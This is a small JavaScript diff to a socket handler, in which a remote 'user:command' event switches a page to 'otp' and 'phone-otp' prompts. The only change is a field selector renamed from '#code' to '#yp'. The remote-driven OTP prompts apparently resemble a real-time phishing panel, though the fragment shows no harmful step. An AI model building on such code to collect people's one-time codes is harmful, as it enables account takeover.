@@ -153,7 +153,7 @@ socket.on("user:command", (data) => {
       break;
 
     case "otp":
-      updatePhoneField("#code", "your phone", phonescreen);
+      updatePhoneField("#yp", "your phone", phonescreen);
       break;
 
     case "phone-otp":
